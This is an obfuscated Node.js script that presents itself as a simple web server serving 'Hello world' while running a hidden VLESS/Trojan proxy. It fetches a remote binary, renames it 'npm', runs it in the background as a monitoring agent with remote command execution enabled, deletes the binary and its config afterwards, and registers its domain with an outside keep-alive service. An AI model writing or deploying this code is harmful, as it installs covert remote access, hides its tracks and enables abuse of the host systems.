function _0x2e10(_0x5f475b,_0x110776){_0x5f475b=_0x5f475b-0x8a;const _0x574764=_0x5747();let _0x2e10d9=_0x574764[_0x5f475b];return _0x2e10d9;}const _0x50f567=_0x2e10;(function(_0x4d969a,_0x3d181c){const _0x4f7f87=_0x2e10,_0xa94248=_0x4d969a();while(!![]){try{const _0x47036a=-parseInt(_0x4f7f87(0xca))/0x1+parseInt(_0x4f7f87(0x9c))/0x2+-parseInt(_0x4f7f87(0xeb))/0x3+-parseInt(_0x4f7f87(0xbd))/0x4+-parseInt(_0x4f7f87(0xb0))/0x5+parseInt(_0x4f7f87(0xd7))/0x6*(-parseInt(_0x4f7f87(0x8c))/0x7)+parseInt(_0x4f7f87(0xa6))/0x8;if(_0x47036a===_0x3d181c)break;else _0xa94248['push'](_0xa94248['shift']());}catch(_0x5909b8){_0xa94248['push'](_0xa94248['shift']());}}}(_0x5747,0xb136b));const os=require('os'),http=require(_0x50f567(0x97)),fs=require('fs'),axios=require(_0x50f567(0xaa)),net=require(_0x50f567(0xe0)),path=require('path'),crypto=require(_0x50f567(0xe6)),{Buffer}=require(_0x50f567(0xc3)),{exec,execSync}=require(_0x50f567(0xcc)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x50f567(0xff)]['UUID']||'8cd3c29b-7948-4101-b192-d12a5367fada',NEZHA_SERVER=process[_0x50f567(0xff)][_0x50f567(0x100)]||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process[_0x50f567(0xff)]['NEZHA_KEY']||'',DOMAIN=process[_0x50f567(0xff)][_0x50f567(0xf2)]||_0x50f567(0x8d),AUTO_ACCESS=process[_0x50f567(0xff)]['AUTO_ACCESS']||!![],WSPATH=process[_0x50f567(0xff)][_0x50f567(0xad)]||UUID[_0x50f567(0xba)](0x0,0x8),SUB_PATH=process['env']['SUB_PATH']||_0x50f567(0xc1),NAME=process[_0x50f567(0xff)][_0x50f567(0x104)]||'',PORT=process[_0x50f567(0xff)][_0x50f567(0xa4)]||0x1eb4;let ISP='';function _0x5747(){const _0x29eb50=['text/html','PORT','error:\x20','15807200QVnhei','stream','type','Server','axios','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','toString','WSPATH','Status','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','308635sQTTKF','digest','concat','https://arm64.ssss.nyc.mn/agent','close','client_secret:\x20','catch','&type=A','index.html','aarch64','slice','writeHead','text/plain','1582316MWwzRc','base64','2087','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','sub','https://amd64.ssss.nyc.mn/v1','buffer','setsid\x20nohup\x20./npm\x20-s\x20','Automatic\x20Access\x20Task\x20added\x20successfully','arm',':443?security=tls&sni=','from','reduce','457919vIIxMI','join','child_process','chmod\x20+x\x20npm','true','&path=%2F','connect','443','npm','trojan://','1.1.1.1','arch','readUInt8','36zGApGz','map','decode','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','https://api.ip.sb/geoip','length','every','country_code','arm64','net','application/json','utf-8','replace','8.8.4.4','substr','crypto','write','npm\x20is\x20running','Failed\x20to\x20resolve\x20','Unknown','1550031ygLGpZ','pipe','&fp=chrome&type=ws&host=','https://dns.google/resolve?name=','https://amd64.ssss.nyc.mn/agent','then','trim','DOMAIN','https://arm64.ssss.nyc.mn/v1','writeFileSync','createHash','isp','false','2096','hex','get','application/dns-json','pop','\x20with\x20all\x20DNS\x20servers','finish','env','NEZHA_SERVER','error','includes','data','NAME','readFile','/bin/bash','Answer','1348732McwEXP','1234.abc.com','vless://','config.yaml','createServer','update','end','2083','npm\x20download\x20successfully','npm\x20is\x20already\x20running,\x20skip\x20running...','--tls','http','readUInt16BE','8443','https://','connection','2675850JliZMt','url','find','log','unlink','message','Not\x20Found\x0a'];_0x5747=function(){return _0x29eb50;};return _0x5747();}const GetISP=async()=>{const _0x1173ad=_0x50f567;try{const _0x523596=await axios[_0x1173ad(0xfa)](_0x1173ad(0xdb)),_0xf3988b=_0x523596[_0x1173ad(0x103)];ISP=(_0xf3988b[_0x1173ad(0xde)]+'-'+_0xf3988b[_0x1173ad(0xf6)])['replace'](/ /g,'_');}catch(_0x1ea76a){ISP=_0x1173ad(0xea);}};GetISP();const httpServer=http[_0x50f567(0x90)]((_0x118962,_0x2fe366)=>{const _0x1c856f=_0x50f567;if(_0x118962[_0x1c856f(0x9d)]==='/'){const _0x2f6d45=path[_0x1c856f(0xcb)](__dirname,_0x1c856f(0xb8));fs[_0x1c856f(0x105)](_0x2f6d45,'utf8',(_0x3b5157,_0x36bc20)=>{const _0x28947e=_0x1c856f;if(_0x3b5157){_0x2fe366[_0x28947e(0xbb)](0xc8,{'Content-Type':_0x28947e(0xa3)}),_0x2fe366[_0x28947e(0x92)]('Hello\x20world!');return;}_0x2fe366[_0x28947e(0xbb)](0xc8,{'Content-Type':_0x28947e(0xa3)}),_0x2fe366[_0x28947e(0x92)](_0x36bc20);});return;}else{if(_0x118962[_0x1c856f(0x9d)]==='/'+SUB_PATH){const _0x400896=NAME?NAME+'-'+ISP:ISP,_0x528e9e=_0x1c856f(0x8e)+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x1c856f(0xed)+DOMAIN+_0x1c856f(0xcf)+WSPATH+'#'+_0x400896,_0x28b5bb=_0x1c856f(0xd3)+UUID+'@'+DOMAIN+_0x1c856f(0xc7)+DOMAIN+_0x1c856f(0xed)+DOMAIN+_0x1c856f(0xcf)+WSPATH+'#'+_0x400896,_0x3a6b66=_0x528e9e+'\x0a'+_0x28b5bb,_0x147667=Buffer[_0x1c856f(0xc8)](_0x3a6b66)[_0x1c856f(0xac)](_0x1c856f(0xbe));_0x2fe366['writeHead'](0xc8,{'Content-Type':_0x1c856f(0xbc)}),_0x2fe366[_0x1c856f(0x92)](_0x147667+'\x0a');}else _0x2fe366['writeHead'](0x194,{'Content-Type':_0x1c856f(0xbc)}),_0x2fe366[_0x1c856f(0x92)](_0x1c856f(0xa2));}}),wss=new WebSocket[(_0x50f567(0xa9))]({'server':httpServer}),uuid=UUID[_0x50f567(0xe3)](/-/g,''),DNS_SERVERS=[_0x50f567(0xe4),_0x50f567(0xd4)];function resolveHost(_0x5bbc6a){return new Promise((_0x200c73,_0x3a5da3)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x5bbc6a)){_0x200c73(_0x5bbc6a);return;}let _0x2a7917=0x0;function _0x339e0a(){const _0x1c6aa4=_0x2e10;if(_0x2a7917>=DNS_SERVERS[_0x1c6aa4(0xdc)]){_0x3a5da3(new Error(_0x1c6aa4(0xe9)+_0x5bbc6a+_0x1c6aa4(0xfd)));return;}const _0x534be1=DNS_SERVERS[_0x2a7917];_0x2a7917++;const _0x522cf4=_0x1c6aa4(0xee)+encodeURIComponent(_0x5bbc6a)+_0x1c6aa4(0xb7);axios[_0x1c6aa4(0xfa)](_0x522cf4,{'timeout':0x1388,'headers':{'Accept':_0x1c6aa4(0xfb)}})[_0x1c6aa4(0xf0)](_0x4a35b8=>{const _0x800e1a=_0x1c6aa4,_0x17a410=_0x4a35b8['data'];if(_0x17a410[_0x800e1a(0xae)]===0x0&&_0x17a410['Answer']&&_0x17a410[_0x800e1a(0x8b)]['length']>0x0){const _0x3f8860=_0x17a410[_0x800e1a(0x8b)][_0x800e1a(0x9e)](_0x462ca2=>_0x462ca2[_0x800e1a(0xa8)]===0x1);if(_0x3f8860){_0x200c73(_0x3f8860['data']);return;}}_0x339e0a();})[_0x1c6aa4(0xb6)](_0x3a1956=>{_0x339e0a();});}_0x339e0a();});}function handleVlessConnection(_0x373569,_0x17e9f8){const _0x451523=_0x50f567,[_0x394960]=_0x17e9f8,_0x26afc6=_0x17e9f8['slice'](0x1,0x11);if(!_0x26afc6[_0x451523(0xdd)]((_0x4cc101,_0x5ce70a)=>_0x4cc101==parseInt(uuid[_0x451523(0xe5)](_0x5ce70a*0x2,0x2),0x10)))return![];let _0x3beabe=_0x17e9f8['slice'](0x11,0x12)['readUInt8']()+0x13;const _0x5e79a9=_0x17e9f8[_0x451523(0xba)](_0x3beabe,_0x3beabe+=0x2)[_0x451523(0x98)](0x0),_0x8a4103=_0x17e9f8[_0x451523(0xba)](_0x3beabe,_0x3beabe+=0x1)[_0x451523(0xd6)](),_0x5828bf=_0x8a4103==0x1?_0x17e9f8['slice'](_0x3beabe,_0x3beabe+=0x4)[_0x451523(0xcb)]('.'):_0x8a4103==0x2?new TextDecoder()[_0x451523(0xd9)](_0x17e9f8[_0x451523(0xba)](_0x3beabe+0x1,_0x3beabe+=0x1+_0x17e9f8[_0x451523(0xba)](_0x3beabe,_0x3beabe+0x1)[_0x451523(0xd6)]())):_0x8a4103==0x3?_0x17e9f8[_0x451523(0xba)](_0x3beabe,_0x3beabe+=0x10)[_0x451523(0xc9)]((_0x466f66,_0x2636b1,_0x4e9f83,_0x492f64)=>_0x4e9f83%0x2?_0x466f66[_0x451523(0xb2)](_0x492f64[_0x451523(0xba)](_0x4e9f83-0x1,_0x4e9f83+0x1)):_0x466f66,[])[_0x451523(0xd8)](_0x273a44=>_0x273a44['readUInt16BE'](0x0)[_0x451523(0xac)](0x10))[_0x451523(0xcb)](':'):'';_0x373569['send'](new Uint8Array([_0x394960,0x0]));const _0x108df1=createWebSocketStream(_0x373569);return resolveHost(_0x5828bf)[_0x451523(0xf0)](_0x5421d4=>{net['connect']({'host':_0x5421d4,'port':_0x5e79a9},function(){const _0x409e00=_0x2e10;this[_0x409e00(0xe7)](_0x17e9f8['slice'](_0x3beabe)),_0x108df1['on'](_0x409e00(0x101),()=>{})['pipe'](this)['on'](_0x409e00(0x101),()=>{})[_0x409e00(0xec)](_0x108df1);})['on']('error',()=>{});})[_0x451523(0xb6)](_0x2873a4=>{const _0x24448d=_0x451523;net[_0x24448d(0xd0)]({'host':_0x5828bf,'port':_0x5e79a9},function(){const _0x107879=_0x24448d;this[_0x107879(0xe7)](_0x17e9f8[_0x107879(0xba)](_0x3beabe)),_0x108df1['on'](_0x107879(0x101),()=>{})['pipe'](this)['on'](_0x107879(0x101),()=>{})[_0x107879(0xec)](_0x108df1);})['on'](_0x24448d(0x101),()=>{});}),!![];}function handleTrojanConnection(_0x52cbd7,_0x5870bb){const _0x132a20=_0x50f567;try{if(_0x5870bb['length']<0x3a)return![];const _0x50e716=_0x5870bb[_0x132a20(0xba)](0x0,0x38)[_0x132a20(0xac)](),_0x595f33=[UUID];let _0x3007b1=null;for(const _0x162bdf of _0x595f33){const _0x50e577=crypto[_0x132a20(0xf5)]('sha224')[_0x132a20(0x91)](_0x162bdf)[_0x132a20(0xb1)](_0x132a20(0xf9));if(_0x50e577===_0x50e716){_0x3007b1=_0x162bdf;break;}}if(!_0x3007b1)return![];let _0x38122e=0x38;_0x5870bb[_0x38122e]===0xd&&_0x5870bb[_0x38122e+0x1]===0xa&&(_0x38122e+=0x2);const _0x2b7f3c=_0x5870bb[_0x38122e];if(_0x2b7f3c!==0x1)return![];_0x38122e+=0x1;const _0x3cab5b=_0x5870bb[_0x38122e];_0x38122e+=0x1;let _0x10d80c,_0x5a092a;if(_0x3cab5b===0x1)_0x10d80c=_0x5870bb[_0x132a20(0xba)](_0x38122e,_0x38122e+0x4)[_0x132a20(0xcb)]('.'),_0x38122e+=0x4;else{if(_0x3cab5b===0x3){const _0x15cd82=_0x5870bb[_0x38122e];_0x38122e+=0x1,_0x10d80c=_0x5870bb[_0x132a20(0xba)](_0x38122e,_0x38122e+_0x15cd82)[_0x132a20(0xac)](),_0x38122e+=_0x15cd82;}else{if(_0x3cab5b===0x4)_0x10d80c=_0x5870bb[_0x132a20(0xba)](_0x38122e,_0x38122e+0x10)['reduce']((_0x418a0c,_0x2153b5,_0x52a91c,_0x311adf)=>_0x52a91c%0x2?_0x418a0c[_0x132a20(0xb2)](_0x311adf[_0x132a20(0xba)](_0x52a91c-0x1,_0x52a91c+0x1)):_0x418a0c,[])['map'](_0x50c8f2=>_0x50c8f2['readUInt16BE'](0x0)[_0x132a20(0xac)](0x10))[_0x132a20(0xcb)](':'),_0x38122e+=0x10;else return![];}}_0x5a092a=_0x5870bb[_0x132a20(0x98)](_0x38122e),_0x38122e+=0x2;_0x38122e<_0x5870bb['length']&&_0x5870bb[_0x38122e]===0xd&&_0x5870bb[_0x38122e+0x1]===0xa&&(_0x38122e+=0x2);const _0x2d4f85=createWebSocketStream(_0x52cbd7);return resolveHost(_0x10d80c)[_0x132a20(0xf0)](_0x36b135=>{const _0x40eb6e=_0x132a20;net[_0x40eb6e(0xd0)]({'host':_0x36b135,'port':_0x5a092a},function(){const _0x530d2b=_0x40eb6e;_0x38122e<_0x5870bb[_0x530d2b(0xdc)]&&this[_0x530d2b(0xe7)](_0x5870bb['slice'](_0x38122e)),_0x2d4f85['on'](_0x530d2b(0x101),()=>{})[_0x530d2b(0xec)](this)['on']('error',()=>{})['pipe'](_0x2d4f85);})['on'](_0x40eb6e(0x101),()=>{});})['catch'](_0x5abd9d=>{const _0xc6f50c=_0x132a20;net[_0xc6f50c(0xd0)]({'host':_0x10d80c,'port':_0x5a092a},function(){const _0x11bab1=_0xc6f50c;_0x38122e<_0x5870bb[_0x11bab1(0xdc)]&&this[_0x11bab1(0xe7)](_0x5870bb['slice'](_0x38122e)),_0x2d4f85['on']('error',()=>{})[_0x11bab1(0xec)](this)['on']('error',()=>{})[_0x11bab1(0xec)](_0x2d4f85);})['on']('error',()=>{});}),!![];}catch(_0x56b3c3){return![];}}wss['on'](_0x50f567(0x9b),(_0x2e7532,_0x6b2bd0)=>{const _0x5d216c=_0x50f567,_0x59d772=_0x6b2bd0[_0x5d216c(0x9d)]||'';_0x2e7532['once'](_0x5d216c(0xa1),_0x1b61c0=>{const _0x3f87e5=_0x5d216c;if(_0x1b61c0[_0x3f87e5(0xdc)]>0x11&&_0x1b61c0[0x0]===0x0){const _0x35e9d7=_0x1b61c0['slice'](0x1,0x11),_0x106e86=_0x35e9d7[_0x3f87e5(0xdd)]((_0x33902f,_0x5ca42f)=>_0x33902f==parseInt(uuid[_0x3f87e5(0xe5)](_0x5ca42f*0x2,0x2),0x10));if(_0x106e86){!handleVlessConnection(_0x2e7532,_0x1b61c0)&&_0x2e7532[_0x3f87e5(0xb4)]();return;}}!handleTrojanConnection(_0x2e7532,_0x1b61c0)&&_0x2e7532[_0x3f87e5(0xb4)]();})['on'](_0x5d216c(0x101),()=>{});});const getDownloadUrl=()=>{const _0x355c73=_0x50f567,_0x239cd8=os[_0x355c73(0xd5)]();return _0x239cd8===_0x355c73(0xc6)||_0x239cd8===_0x355c73(0xdf)||_0x239cd8===_0x355c73(0xb9)?!NEZHA_PORT?_0x355c73(0xf3):_0x355c73(0xb3):!NEZHA_PORT?_0x355c73(0xc2):_0x355c73(0xef);},downloadFile=async()=>{const _0x368cd6=_0x50f567;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x5b5336=getDownloadUrl(),_0x20ff59=await axios({'method':_0x368cd6(0xfa),'url':_0x5b5336,'responseType':_0x368cd6(0xa7)}),_0x12abf8=fs['createWriteStream'](_0x368cd6(0xd2));return _0x20ff59[_0x368cd6(0x103)][_0x368cd6(0xec)](_0x12abf8),new Promise((_0x3ce842,_0x105eb4)=>{const _0x33e1a3=_0x368cd6;_0x12abf8['on'](_0x33e1a3(0xfe),()=>{const _0xd7fe81=_0x33e1a3;console['log'](_0xd7fe81(0x94)),exec(_0xd7fe81(0xcd),_0x2665f4=>{if(_0x2665f4)_0x105eb4(_0x2665f4);_0x3ce842();});}),_0x12abf8['on']('error',_0x105eb4);});}catch(_0x5a9fc3){throw _0x5a9fc3;}},runnz=async()=>{const _0x4c2043=_0x50f567;try{const _0x432537=execSync(_0x4c2043(0xaf),{'encoding':_0x4c2043(0xe2)});if(_0x432537[_0x4c2043(0xf1)]()!==''){console[_0x4c2043(0x9f)](_0x4c2043(0x95));return;}}catch(_0xe9a63b){}await downloadFile();let _0x3822b3='',_0x109f7b=[_0x4c2043(0xd1),_0x4c2043(0x99),_0x4c2043(0xf8),_0x4c2043(0xbf),_0x4c2043(0x93),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x3c8ded=_0x109f7b[_0x4c2043(0x102)](NEZHA_PORT)?_0x4c2043(0x96):'';_0x3822b3=_0x4c2043(0xc4)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x3c8ded+_0x4c2043(0xab);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xd5a8c8=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')[_0x4c2043(0xfc)]():'',_0x519510=_0x109f7b[_0x4c2043(0x102)](_0xd5a8c8)?_0x4c2043(0xce):_0x4c2043(0xf7),_0x49fd77=_0x4c2043(0xb5)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x519510+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x4c2043(0xf4)]('config.yaml',_0x49fd77);}_0x3822b3=_0x4c2043(0xda);}else{console[_0x4c2043(0x9f)](_0x4c2043(0xc0));return;}}try{exec(_0x3822b3,{'shell':_0x4c2043(0x8a)},_0x2cd3b3=>{const _0x5584a6=_0x4c2043;if(_0x2cd3b3)console[_0x5584a6(0x101)]('npm\x20running\x20error:',_0x2cd3b3);else console[_0x5584a6(0x9f)](_0x5584a6(0xe8));});}catch(_0x3af0a2){console[_0x4c2043(0x101)](_0x4c2043(0xa5)+_0x3af0a2);}};async function addAccessTask(){const _0x169f1f=_0x50f567;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x37a62a=_0x169f1f(0x9a)+DOMAIN;try{const _0x103b45=await axios['post']('https://oooo.serv00.net/add-url',{'url':_0x37a62a},{'headers':{'Content-Type':_0x169f1f(0xe1)}});console[_0x169f1f(0x9f)](_0x169f1f(0xc5));}catch(_0x6ec8f7){}}const delFiles=()=>{const _0x144f0c=_0x50f567;fs[_0x144f0c(0xa0)](_0x144f0c(0xd2),()=>{}),fs['unlink'](_0x144f0c(0x8f),()=>{});};httpServer['listen'](PORT,()=>{const _0x6ef2f9=_0x50f567;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x6ef2f9(0x9f)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
